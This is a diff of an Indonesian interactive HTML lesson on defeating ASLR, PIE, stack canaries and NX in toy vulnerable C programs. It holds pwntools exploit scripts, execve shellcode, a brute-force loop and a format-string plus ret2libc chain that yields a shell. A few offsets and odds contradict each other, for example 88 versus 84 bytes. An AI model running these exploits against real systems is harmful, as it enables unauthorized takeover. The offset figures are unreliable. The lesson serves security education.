+    <span class="eq">Offset selalu tetap (tidak terpengaruh ASLR):
+  ret_addr - buf_addr = 72  (konstan)
+  libc_system - libc_base = 0x3a920  (konstan per versi libc)
+  buf - stack_base = 0x3c0  (konstan per run environment)</span>
+    <p style="margin:.5rem 0;font-size:12px">Jadi kalau kita tahu <code>buf_addr</code> dari leak:</p>
+    <span class="eq-hi">shellcode_addr = buf_addr + 0  (shellcode di awal buf)
+ret_addr_lokasi = buf_addr + 72</span>
+    <div class="ok">Dengan satu alamat yang bocor, kita bisa hitung posisi shellcode kita! Tidak perlu tahu base address ASLR sama sekali.</div>
+  </div>
+</div>
+
+<!-- AS STEP 2 -->
+<div class="step-panel" id="as-step-2">
+  <div class="card">
+    <div class="step-title">Langkah 3 — Baca leak dan hitung alamat target</div>
+    <h3>Parse output "buf is at: 0x..." dari program</h3>
+    <div class="code-block">
+<span class="ck">from</span> pwn <span class="ck">import</span> *
+
+p = process(<span class="cs">'./vuln'</span>)
+
+<span class="cm"># Step 1: Baca output yang berisi alamat buf</span>
+line = p.recvline()    <span class="cm"># "buf is at: 0xbf92f3c0\n"</span>
+buf_addr = int(line.split(<span class="cs">b': '</span>)[<span class="cn">1</span>], <span class="cn">16</span>)
+print(<span class="cs">f"buf @ {hex(buf_addr)}"</span>)
+
+<span class="cm"># Step 2: Hitung alamat shellcode (di awal buf)</span>
+shellcode_addr = buf_addr   <span class="cm"># shellcode kita taruh di awal!</span>
+print(<span class="cs">f"shellcode @ {hex(shellcode_addr)}"</span>)
+    </div>
+    <div class="note">buf_addr berbeda tiap run, tapi kita baca dulu sebelum kirim payload — jadi kita selalu tahu alamat yang benar!</div>
+  </div>
+</div>
+
+<!-- AS STEP 3 -->
+<div class="step-panel" id="as-step-3">
+  <div class="card">
+    <div class="step-title">Langkah 4 — Susun dan kirim payload</div>
+    <h3>Payload sama seperti shellcode biasa, tapi return address dinamis</h3>
+    <div class="code-block">
+shellcode = (
+    b<span class="cs">'\x31\xc0\x50\x68\x2f\x2f\x73\x68'</span>
+    b<span class="cs">'\x68\x2f\x62\x69\x6e\x89\xe3\x31'</span>
+    b<span class="cs">'\xc9\x31\xd2\xb0\x0b\xcd\x80'</span>
+)  <span class="cm"># 23 byte</span>
+
+nop_count = <span class="cn">72</span> - len(shellcode)  <span class="cm"># = 49 byte NOP</span>
+
+payload  = shellcode
+payload += b<span class="cs">'\x90'</span> * nop_count     <span class="cm"># NOP padding</span>
+payload += p32(shellcode_addr)   <span class="cm"># ← alamat DINAMIS dari leak!</span>
+
+p.sendline(payload)
+p.interactive()
+<span class="cm"># → Shell terbuka, meski ASLR aktif!</span>
+    </div>
+  </div>
+</div>
+
+<!-- AS STEP 4 -->
+<div class="step-panel" id="as-step-4">
+  <div class="card">
+    <div class="step-title">Langkah 5 — Ringkasan Bypass ASLR</div>
+    <div style="text-align:center;padding:1.25rem;background:#f5f5f5;border-radius:12px;border:0.5px solid #ddd;margin-bottom:.75rem">
+      <div style="font-size:12px;color:#888;margin-bottom:6px">Kunci bypass ASLR</div>
+      <div class="big-ans">Leak 1 alamat → hitung semua dari offset</div>
+    </div>
+    <div style="padding:.75rem 1rem;background:#f5f5f5;border-left:3px solid #534AB7">
+      <p style="font-size:12px;font-weight:500;margin-bottom:6px">Ringkasan Bypass ASLR</p>
+      <p style="font-size:12px">ASLR: base address stack/heap/libc berubah tiap run</p>
+      <p style="font-size:12px">Bypass: cari leak satu alamat (printf %p, format string, dll)</p>
+      <p style="font-size:12px">Hitung: target = leaked_addr ± known_offset</p>
+      <p style="font-size:12px">Offset selalu konstan untuk binary yang sama</p>
+      <p style="font-size:12px;color:#A32D2D;margin-top:4px">Tanpa leak: brute force 32-bit (hanya 16-bit entropy di ASLR Linux 32-bit = 65536 kemungkinan)</p>
+    </div>
+  </div>
+</div>
+</div><!-- end aslr -->
+
+<!-- ============================================================ -->
+<!-- PIE BYPASS -->
+<!-- ============================================================ -->
+<div id="sec-pie" class="sec">
+<div class="soal-card">
+  <div style="font-size:11px;font-weight:500;text-transform:uppercase;letter-spacing:.07em;color:#534AB7;margin-bottom:6px">Soal 4 — Bypass PIE</div>
+  <h2 style="color:#26215C">Alamat kode program acak — tapi 12 bit bawah tidak berubah!</h2>
+  <p style="color:#3C3489;margin-top:6px;margin-bottom:.75rem">PIE mengacak base address program itu sendiri. Tapi ada teknik <strong>partial overwrite</strong> — kita hanya overwrite 1-2 byte terbawah return address untuk loncat ke fungsi lain dalam binary yang sama!</p>
+  <div class="code-block">
+<span class="ck">void</span> win() { system(<span class="cs">"/bin/sh"</span>); }  <span class="cm">// target!</span>
+
+<span class="ck">void</span> vuln() {
+    <span class="ck">char</span> buf[<span class="cn">16</span>];
+    read(<span class="cn">0</span>, buf, <span class="cn">32</span>);    <span class="cm">// overflow 16 byte</span>
+}
+  </div>
+  <div style="background:#fff;border-radius:8px;padding:.6rem .85rem;font-family:monospace;font-size:12px;border:0.5px solid #AFA9EC;margin-top:.5rem">
+    <div>Offset ret addr: <span style="color:#791F1F">24 byte</span> dari buf</div>
+    <div>Proteksi: PIE: <span style="color:#791F1F">ON</span> | ASLR: ON | NX: ON | Canary: OFF</div>
+    <div>win() di offset <span style="color:#27500A">0x???4a0</span> dari binary base (12 bit bawah = 0x4a0, tetap!)</div>
+    <div>vuln() ret addr saat ini (dari leak): <span style="color:#D85A30">0x55555555...X</span> dimana 12 bit bawah diketahui</div>
+  </div>
+</div>
+
+<div class="step-nav">
+  <button class="btn-nav" id="pi-prev" onclick="prevStep('pi')" disabled>Prev</button>
+  <div class="step-dots" id="pi-dots"></div>
+  <span class="step-label" id="pi-counter">1 / 5</span>
+  <button class="btn-nav btn-next" id="pi-next" onclick="nextStep('pi')">Next</button>
+</div>
+
+<!-- PI STEP 0 -->
+<div class="step-panel active" id="pi-step-0">
+  <div class="card">
+    <div class="step-title">Langkah 1 — Cara kerja PIE</div>
+    <h3>PIE: bahkan alamat kode program itu sendiri berubah</h3>
+    <div class="code-block">
+<span class="cm"># Tanpa PIE: semua fungsi di alamat tetap</span>
+win()  always at 0x08048400
+vuln() always at 0x08048450
+
+<span class="cm"># Dengan PIE: base address binary berubah tiap run</span>
+Run 1: base=0x55555555000, win() at 0x555555554400
+Run 2: base=0x56781234000, win() at 0x567812344400
+Run 3: base=0x7f4321ab000, win() at 0x7f4321ab4400
+    </div>
+    <p style="font-size:12px;margin:.5rem 0">Tapi perhatikan satu hal krusial:</p>
+    <span class="eq-hi">12 bit terbawah (3 nibble hex) TIDAK berubah!
+win() selalu berakhiran ...0x4a0
+vuln() selalu berakhiran ...0x4e0
+(offset dalam page 4KB selalu sama)</span>
+    <div class="ok">Kalau kita hanya overwrite 1 byte (atau 2 byte) terbawah return address, kita bisa arahkan ke win() tanpa tahu base address!</div>
+  </div>
+</div>
+
+<!-- PI STEP 1 -->
+<div class="step-panel" id="pi-step-1">
+  <div class="card">
+    <div class="step-title">Langkah 2 — Teknik partial overwrite</div>
+    <h3>Overwrite hanya 1-2 byte terbawah return address</h3>
+    <p style="margin-bottom:.75rem">Return address saat ini (misal): <code>0x55555555 04e8</code> (ret dari dalam vuln())</p>
+    <p style="margin:.5rem 0">Target win() ada di: <code>0x55555555 04a0</code></p>
+    <p style="margin:.5rem 0">Perbedaan hanya di 1 byte terakhir: 0xe8 → 0xa0</p>
+    <span class="eq">ret addr asli: 0x55555555 04 e8
+                              ↓↓
+win() offset:  0x55555555 04 a0
+                              ↑↑
+    Hanya 1 byte yang berbeda! (0xe8 → 0xa0)</span>
+    <div class="code-block">
+<span class="cm"># Partial overwrite: hanya kirim 1 byte untuk ganti nibble terakhir</span>
+payload  = b<span class="cs">'A'</span> * <span class="cn">24</span>       <span class="cm"># padding ke ret addr</span>
+payload += b<span class="cs">'\xa0'</span>         <span class="cm"># overwrite hanya 1 byte terbawah!</span>
+<span class="cm"># (read() membaca persis 25 byte, tidak null-terminate)</span>
+    </div>
+    <div class="note">Partial overwrite hanya mungkin kalau ada 4 bit ambiguity (1 nibble = 16 kemungkinan). Probabilitas sukses: 1/16 = 6.25%. Tapi kalau bisa dikirim ulang, brute force cepat!</div>
+  </div>
+</div>
+
+<!-- PI STEP 2 -->
+<div class="step-panel" id="pi-step-2">
+  <div class="card">
+    <div class="step-title">Langkah 3 — Bypass PIE dengan leak</div>
+    <h3>Cara lebih reliable: leak satu alamat → hitung binary base</h3>
+    <p style="margin-bottom:.75rem">Kalau ada leak alamat fungsi/variabel di binary:</p>
+    <div class="code-block">
+<span class="cm"># Misal program print alamat main():</span>
+printf(<span class="cs">"main: %p\n"</span>, main);
+<span class="cm"># Output: main: 0x555555554520</span>
+
+<span class="cm"># Dari binary (readelf/objdump), main offset dari base:</span>
+<span class="cm"># main offset = 0x520 (12 bit bawah selalu tetap)</span>
+
+binary_base = leaked_main - <span class="cn">0x520</span>
+win_addr    = binary_base + <span class="cn">0x4a0</span>   <span class="cm"># offset win() dari base</span>
+
+print(<span class="cs">f"binary base: {hex(binary_base)}"</span>)
+print(<span class="cs">f"win() at: {hex(win_addr)}"</span>)
+    </div>
+    <div class="ok">Dengan binary base diketahui, kita bisa hitung alamat semua fungsi dalam binary — win(), gadget ROP, dll.</div>
+  </div>
+</div>
+
+<!-- PI STEP 3 -->
+<div class="step-panel" id="pi-step-3">
+  <div class="card">
+    <div class="step-title">Langkah 4 — Payload partial overwrite</div>
+    <h3>Susun payload dan kirim berulang sampai berhasil</h3>
+    <div class="code-block">
+<span class="ck">from</span> pwn <span class="ck">import</span> *
+
+<span class="ck">while</span> <span class="cn">True</span>:
+    p = process(<span class="cs">'./vuln'</span>)
+
+    <span class="cm"># Partial overwrite: 24 byte padding + 1 byte overwrite</span>
+    payload  = b<span class="cs">'A'</span> * <span class="cn">24</span>
+    payload += b<span class="cs">'\xa0'</span>   <span class="cm"># target: offset win() = 0x?a0</span>
+
+    p.send(payload)    <span class="cm"># pakai send bukan sendline (no newline!)</span>
+
+    <span class="ck">try</span>:
+        p.recv(timeout=<span class="cn">1</span>)
+        p.sendline(<span class="cs">b'id'</span>)
+        output = p.recv()
+        <span class="ck">if</span> <span class="cs">b'uid'</span> <span class="ck">in</span> output:
+            print(<span class="cs">"Shell!"</span>, output)
+            p.interactive()
+            <span class="ck">break</span>
+    <span class="ck">except</span>:
+        p.close()      <span class="cm"># crash → coba lagi</span>
+    </div>
+    <div class="warn">Probabilitas 1/16 per percobaan → rata-rata 8 percobaan. Untuk partial overwrite 2 byte: 1/256 → ~128 percobaan. Tetap feasible!</div>
+  </div>
+</div>
+
+<!-- PI STEP 4 -->
+<div class="step-panel" id="pi-step-4">
+  <div class="card">
+    <div class="step-title">Langkah 5 — Ringkasan semua bypass</div>
+    <table class="tbl" style="margin-bottom:.75rem">
+      <tr><th>Proteksi</th><th>Bypass utama</th><th>Syarat</th></tr>
+      <tr><td style="font-weight:500">NX</td><td>ret2libc / ROP chain</td><td>Tahu alamat libc/gadget</td></tr>
+      <tr><td style="font-weight:500">Canary</td><td>Leak via format string / brute force fork</td><td>Ada info leak atau server fork</td></tr>
+      <tr><td style="font-weight:500">ASLR</td><td>Leak satu alamat + relative offset</td><td>Ada fungsi yang print alamat</td></tr>
+      <tr><td style="font-weight:500">PIE</td><td>Partial overwrite / leak binary base</td><td>1-2 byte ambiguity atau info leak</td></tr>
+      <tr><td style="font-weight:500">RELRO</td><td>Partial: overwrite GOT. Full: heap exploit</td><td>Write primitive setelah ret2libc</td></tr>
+    </table>
+    <div style="text-align:center;padding:1.25rem;background:#f5f5f5;border-radius:12px;border:0.5px solid #ddd">
+      <div style="font-size:12px;color:#888;margin-bottom:6px">Prinsip utama</div>
+      <div class="big-ans">Setiap proteksi punya satu asumsi — temukan di mana asumsi itu bisa dilanggar</div>
+    </div>
+  </div>
+</div>
+</div><!-- end pie -->
+
+<!-- ============================================================ -->
+<!-- SOAL GABUNGAN -->
+<!-- ============================================================ -->
+<div id="sec-combined" class="sec">
+<div class="soal-card">
+  <div style="font-size:11px;font-weight:500;text-transform:uppercase;letter-spacing:.07em;color:#534AB7;margin-bottom:6px">Soal Gabungan — NX + Canary + ASLR</div>
+  <h2 style="color:#26215C">Tiga proteksi aktif sekaligus — tiga bypass berurutan!</h2>
+  <p style="color:#3C3489;margin-top:6px;margin-bottom:.75rem">Ini simulasi soal CTF nyata. Semua proteksi aktif kecuali PIE. Kamu harus: (1) leak canary, (2) leak libc address, (3) susun ret2libc. Semua dalam satu sesi koneksi.</p>
+  <div class="code-block">
+<span class="ck">void</span> vuln() {
+    <span class="ck">char</span> buf[<span class="cn">64</span>];
+    <span class="ck">char</span> fmt[<span class="cn">128</span>];
+    puts(<span class="cs">"Enter name:"</span>);
+    fgets(fmt, <span class="cn">128</span>, stdin);
+    printf(fmt);            <span class="cm">// ← format string: leak canary + libc</span>
+    puts(<span class="cs">"Enter data:"</span>);
+    fgets(buf, <span class="cn">120</span>, stdin);  <span class="cm">// ← overflow dengan 120 byte!</span>
+}
+  </div>
+  <div style="background:#fff;border-radius:8px;padding:.6rem .85rem;font-family:monospace;font-size:12px;border:0.5px solid #AFA9EC;margin-top:.5rem">
+    <div>NX: <span style="color:#791F1F">ON</span> | Canary: <span style="color:#791F1F">ON</span> | ASLR: <span style="color:#791F1F">ON</span> | PIE: OFF</div>
+    <div>buf offset ke ret: <span style="color:#791F1F">88 byte</span> (64 + 4 canary + 4 EBP + 16 align)</div>
+    <div>Canary di format string: <span style="color:#D85A30">offset ke-17</span></div>
+    <div>Alamat libc puts@got di format string: <span style="color:#D85A30">offset ke-5</span></div>
+    <div>puts() offset dari libc base: <span style="color:#27500A">0x067360</span></div>
+    <div>system() offset dari libc base: <span style="color:#27500A">0x03a920</span></div>
+    <div>"/bin/sh" offset dari libc base: <span style="color:#27500A">0x15ba0b</span></div>
+  </div>
+</div>
+
+<div class="step-nav">
+  <button class="btn-nav" id="cb-prev" onclick="prevStep('cb')" disabled>Prev</button>
+  <div class="step-dots" id="cb-dots"></div>
+  <span class="step-label" id="cb-counter">1 / 6</span>
+  <button class="btn-nav btn-next" id="cb-next" onclick="nextStep('cb')">Next</button>
+</div>
+
+<!-- CB STEP 0 -->
+<div class="step-panel active" id="cb-step-0">
+  <div class="card">
+    <div class="step-title">Langkah 1 — Rencana serangan (attack plan)</div>
+    <h3>Tiga fase yang harus dilakukan berurutan</h3>
+    <div style="display:flex;flex-direction:column;gap:.4rem;font-size:12px;margin:.5rem 0">
+      <div class="step-box">
+        <div style="font-weight:500;color:#534AB7;margin-bottom:3px">Fase 1: Leak canary + libc address</div>
+        <div style="color:#555">Kirim format string → %17$p untuk canary, %5$p untuk puts@libc</div>
+      </div>
+      <div class="step-box">
+        <div style="font-weight:500;color:#534AB7;margin-bottom:3px">Fase 2: Hitung alamat target</div>
+        <div style="color:#555">libc_base = leaked_puts - puts_offset. Hitung system() dan "/bin/sh"</div>
+      </div>
+      <div class="step-box">
+        <div style="font-weight:500;color:#534AB7;margin-bottom:3px">Fase 3: Kirim payload ret2libc + canary</div>
+        <div style="color:#555">[buf fill][canary][EBP][system()][exit()]["/bin/sh"]</div>
+      </div>
+    </div>
+    <div class="note">Semua fase harus dalam SATU sesi koneksi — kalau terputus, canary dan alamat libc berubah!</div>
+  </div>
+</div>
+
+<!-- CB STEP 1 -->
+<div class="step-panel" id="cb-step-1">
+  <div class="card">
+    <div class="step-title">Langkah 2 — Fase 1: Leak canary dan libc</div>
+    <h3>Satu format string untuk dua leak sekaligus</h3>
+    <div class="code-block">
+<span class="ck">from</span> pwn <span class="ck">import</span> *
+
+p = process(<span class="cs">'./vuln'</span>)
+
+<span class="cm"># Kirim format string untuk leak dua nilai sekaligus</span>
+p.recvuntil(<span class="cs">b'Enter name:\n'</span>)
+p.sendline(<span class="cs">b'%5$p.%17$p'</span>)
+<span class="cm"># %5$p  = puts address di libc (bukan GOT, tapi sudah resolve)</span>
+<span class="cm"># %17$p = canary value</span>
+
+leak = p.recvline().strip().split(<span class="cs">b'.'</span>)
+puts_leak  = int(leak[<span class="cn">0</span>], <span class="cn">16</span>)
+canary     = int(leak[<span class="cn">1</span>], <span class="cn">16</span>)
+
+print(<span class="cs">f"puts leak: {hex(puts_leak)}"</span>)
+print(<span class="cs">f"canary:    {hex(canary)}"</span>)
+    </div>
+    <div class="ok">Dua nilai kritis sudah didapat dalam satu round-trip!</div>
+  </div>
+</div>
+
+<!-- CB STEP 2 -->
+<div class="step-panel" id="cb-step-2">
+  <div class="card">
+    <div class="step-title">Langkah 3 — Fase 2: Hitung semua alamat</div>
+    <h3>Dari satu leak → hitung system() dan "/bin/sh"</h3>
+    <div class="code-block">
+<span class="cm"># Hitung libc base dari puts leak</span>
+puts_offset   = <span class="cn">0x067360</span>   <span class="cm"># offset puts dari libc base</span>
+system_offset = <span class="cn">0x03a920</span>   <span class="cm"># offset system dari libc base</span>
+binsh_offset  = <span class="cn">0x15ba0b</span>   <span class="cm"># offset "/bin/sh" dari libc base</span>
+
+libc_base  = puts_leak - puts_offset
+system_addr = libc_base + system_offset
+binsh_addr  = libc_base + binsh_offset
+exit_addr   = libc_base + <span class="cn">0x02e9d0</span>   <span class="cm"># offset exit</span>
+
+print(<span class="cs">f"libc base:  {hex(libc_base)}"</span>)
+print(<span class="cs">f"system():   {hex(system_addr)}"</span>)
+print(<span class="cs">f"/bin/sh:    {hex(binsh_addr)}"</span>)
+    </div>
+    <div class="note">Offset tiap fungsi dari libc base TIDAK berubah meski ASLR aktif — hanya base-nya yang berubah. Ini yang membuat relative offset sangat powerful.</div>
+  </div>
+</div>
+
+<!-- CB STEP 3 -->
+<div class="step-panel" id="cb-step-3">
+  <div class="card">
+    <div class="step-title">Langkah 4 — Fase 3: Susun payload final</div>
+    <h3>Gabungkan bypass canary + ret2libc dalam satu payload</h3>
+    <div class="code-block">
+<span class="cm"># Payload: buf(64) + canary(4) + EBP(4) + system + exit + binsh</span>
+<span class="cm"># Total = 64 + 4 + 4 + 4 + 4 + 4 = 84 byte</span>
+
+p.recvuntil(<span class="cs">b'Enter data:\n'</span>)
+
+payload  = b<span class="cs">'A'</span> * <span class="cn">64</span>              <span class="cm"># isi buffer</span>
+payload += p32(canary)            <span class="cm"># CANARY ASLI — tidak berubah!</span>
+payload += b<span class="cs">'B'</span> * <span class="cn">4</span>               <span class="cm"># fake saved EBP</span>
+payload += p32(system_addr)       <span class="cm"># ret2libc: system()</span>
+payload += p32(exit_addr)         <span class="cm"># "return" dari system</span>
+payload += p32(binsh_addr)        <span class="cm"># arg1: "/bin/sh"</span>
+
+p.sendline(payload)
+p.interactive()
+    </div>
+    <div class="ok" style="margin-top:.5rem">Satu payload, tiga bypass sekaligus: NX (ret2libc bukan shellcode), Canary (tulis canary asli), ASLR (alamat dari runtime leak)!</div>
+  </div>
+</div>
+
+<!-- CB STEP 4 -->
+<div class="step-panel" id="cb-step-4">
+  <div class="card">
+    <div class="step-title">Langkah 5 — Trace eksekusi gabungan</div>
+    <h3>Apa yang terjadi step by step</h3>
+    <div style="display:flex;flex-direction:column;gap:.4rem;font-size:12px;margin:.5rem 0">
+      <div class="step-box"><div style="font-weight:500;margin-bottom:2px">1. Kirim "%5$p.%17$p"</div><div style="color:#555">→ Server print puts@libc dan canary dalam satu baris</div></div>
+      <div class="step-box"><div style="font-weight:500;margin-bottom:2px">2. Parse dan hitung</div><div style="color:#555">→ libc_base, system(), "/bin/sh", exit() semuanya diketahui</div></div>
+      <div class="step-box"><div style="font-weight:500;margin-bottom:2px">3. Kirim 84 byte payload</div><div style="color:#555">→ Overflow terjadi, canary tidak berubah → cek canary LOLOS</div></div>
+      <div class="step-box"><div style="font-weight:500;margin-bottom:2px">4. vuln() return</div><div style="color:#555">→ CPU baca ret addr = system() → loncat ke sana</div></div>
+      <div class="step-box" style="background:#EEEDFE;border-left-color:#534AB7"><div style="font-weight:500;color:#26215C;margin-bottom:2px">5. system("/bin/sh") dieksekusi</div><div style="color:#3C3489">→ Shell terbuka! Semua proteksi ter-bypass.</div></div>
+    </div>
+    <div style="text-align:center;padding:1.25rem;background:#1a1a2e;border-radius:12px;margin:.75rem 0">
+      <div style="font-size:12px;color:#888;margin-bottom:6px">Hasil akhir</div>
+      <div class="big-ans" style="color:#a8ff78">$ id → uid=0(root) gid=0(root)</div>
+    </div>
+  </div>
+</div>
+
+<!-- CB STEP 5 -->
+<div class="step-panel" id="cb-step-5">
+  <div class="card">
+    <div class="step-title">Langkah 6 — Tabel lengkap semua proteksi</div>
+    <table class="tbl" style="margin-bottom:.75rem">
+      <tr><th>Proteksi</th><th>Asumsi yang dilanggar</th><th>Teknik bypass</th></tr>
+      <tr><td>NX</td><td>"Attacker tidak punya kode di memori executable"</td><td>Pakai kode yang sudah ada (ret2libc/ROP)</td></tr>
+      <tr><td>Canary</td><td>"Attacker tidak tahu nilai canary"</td><td>Leak via format string / brute force fork</td></tr>
+      <tr><td>ASLR</td><td>"Attacker tidak tahu alamat memori"</td><td>Leak satu alamat → hitung offset</td></tr>
+      <tr><td>PIE</td><td>"Attacker tidak tahu alamat kode program"</td><td>Partial overwrite / leak binary base</td></tr>
+      <tr><td>RELRO</td><td>"GOT table tidak bisa ditulis"</td><td>Partial RELRO: overwrite GOT sebelum resolve</td></tr>
+    </table>
+    <div style="padding:.75rem 1rem;background:#f5f5f5;border-left:3px solid #534AB7">
+      <p style="font-size:12px;font-weight:500;margin-bottom:6px">Urutan berpikir saat ada soal bypassing protection</p>
+      <p style="font-size:12px">1. Cek proteksi aktif (checksec)</p>
+      <p style="font-size:12px">2. Cari vulnerability: overflow? format string? UAF?</p>
+      <p style="font-size:12px">3. Cari info leak: ada printf? ada fungsi yang print alamat?</p>
+      <p style="font-size:12px">4. Tentukan urutan bypass: leak dulu → hitung → payload</p>
+      <p style="font-size:12px">5. Susun payload: harus gabungkan semua bypass sekaligus</p>
+      <p style="font-size:12px;color:#534AB7;font-weight:500;margin-top:4px">Kunci: setiap proteksi butuh satu "primitive" untuk di-bypass. Sering cukup satu bug untuk dapat semua primitive!</p>
+    </div>
+  </div>
+</div>
+</div><!-- end combined -->
+
+<script>
+const state={
+  nx:{cur:0,total:6},
+  ca:{cur:0,total:6},
+  as:{cur:0,total:5},
+  pi:{cur:0,total:5},
+  cb:{cur:0,total:6}
+};
+function renderDots(id){
+  const s=state[id];
+  const d=document.getElementById(id+'-dots');
+  d.innerHTML='';
+  for(let i=0;i<s.total;i++){
+    const b=document.createElement('button');
+    b.className='dot';
+    b.style.cssText=i<s.cur?'background:#AFA9EC':i===s.cur?'background:#534AB7;width:24px;border-radius:5px':'background:#ccc';
+    b.onclick=(()=>{const j=i;return()=>goStep(id,j)})();
+    d.appendChild(b);
+  }
+}
+function goStep(id,n){
+  const s=state[id];
+  document.getElementById(id+'-step-'+s.cur).classList.remove('active');
+  s.cur=n;
+  document.getElementById(id+'-step-'+n).classList.add('active');
+  document.getElementById(id+'-counter').textContent=(n+1)+' / '+s.total;
+  document.getElementById(id+'-prev').disabled=n===0;
+  document.getElementById(id+'-next').disabled=n===s.total-1;
+  renderDots(id);
+}
+function nextStep(id){const s=state[id];if(s.cur<s.total-1)goStep(id,s.cur+1);}
+function prevStep(id){const s=state[id];if(s.cur>0)goStep(id,s.cur-1);}
+function showSec(name){
+  document.querySelectorAll('.sec').forEach(s=>s.classList.remove('active'));
+  document.querySelectorAll('.nav-btn').forEach(b=>b.classList.remove('active'));
+  document.getElementById('sec-'+name).classList.add('active');
+  event.target.classList.add('active');
+}
+renderDots('nx');renderDots('ca');renderDots('as');renderDots('pi');renderDots('cb');
+</script>
+</body>
+</html>
